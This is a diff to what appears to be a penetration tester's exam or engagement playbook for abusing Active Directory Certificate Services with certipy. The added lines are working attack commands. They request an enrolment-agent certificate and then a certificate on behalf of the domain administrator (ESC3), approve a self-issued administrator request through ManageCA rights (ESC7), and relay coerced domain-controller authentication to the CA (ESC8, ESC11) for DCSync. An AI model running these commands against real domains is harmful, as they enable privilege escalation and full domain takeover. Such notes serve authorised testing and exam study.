@@ -23,7 +23,10 @@ certipy req -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -t
 ## ESC2 and ESC3: Any Purpose or an enrolment agent
 - [ ] ESC2 (Any Purpose or no EKU): request as in ESC1, then use the cert the same way
 - [ ] ESC3 gives an enrolment-agent cert; get it first, then sign a request for anyone
-certipy req -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -template '<Template>' -on-behalf-of '<Domain>\administrator' -pfx agent.pfx
+certipy req -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -template '<Template>'
+- [ ] <Username>.pfx written: the enrolment-agent certificate for the next request
+certipy req -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -template User -on-behalf-of 'THE-SHORT-DOMAIN\administrator' -pfx '<Username>.pfx'
+- [ ] THE-SHORT-DOMAIN is the domain's NetBIOS short name, not the FQDN in <Domain>
 
 ## ESC4: I can write the template
 Make it an ESC1, request as above, then put it back. -save-configuration writes the backup I restore from.
@@ -36,14 +39,19 @@ certipy template -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -templat
 - [ ] ESC7 (ManageCA): make myself an officer, enable a client-auth template, approve my own request
 certipy ca -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -add-officer '<Username>'
 certipy ca -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -enable-template '<Template>'
+certipy req -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -template '<Template>' -upn administrator@<Domain>
+- [ ] The request is denied and prints its request ID: THE-REQUEST-ID below; save the private key when asked
+certipy ca -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -issue-request THE-REQUEST-ID
+certipy req -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -retrieve THE-REQUEST-ID
 
 ## ESC8 and ESC11: relay to enrolment
 - [ ] Not on the OSCP exam: relay and coercion are kept out as a safe reading; OffSec's pages do not name them
 The CA's HTTP enrolment takes a relayed machine account: coerce a DC and relay it, :Pb responder.
-certipy relay -target 'http://<DCIP>' -template DomainController
+- [ ] <TargetIP> is the CA server, not the DC
+certipy relay -target 'http://<TargetIP>' -template DomainController
 - [ ] The DC's cert from the relay logs in as the DC, enough for a DCSync
 - [ ] ESC11: the CA's RPC enrolment, with no packet privacy, takes the same relay
-certipy relay -target 'rpc://<DCIP>' -ca '<CA>'
+certipy relay -target 'rpc://<TargetIP>' -ca '<CA>'
 
 ## ESC9 and ESC10: weak certificate mapping
 With GenericWrite over <TargetUser>, set its UPN to a victim, request, then set it back.
@@ -60,4 +68,4 @@ certipy auth -pfx administrator.pfx -dc-ip <DCIP> -ldap-shell
 - [ ] Any template changed for ESC4 restored from its .json, any officer added for ESC7 removed
 - [ ] Any UPN changed for ESC9 set back to the one I noted
 - [ ] The NT hash tried everywhere, the account marked Owned in BloodHound: :Pb lateral-movement
-- [ ] DCSync with the domain controller's own hash: :Pb acl-abuse
+- [ ] DCSync with the domain controller's own hash: :Pb dcsync
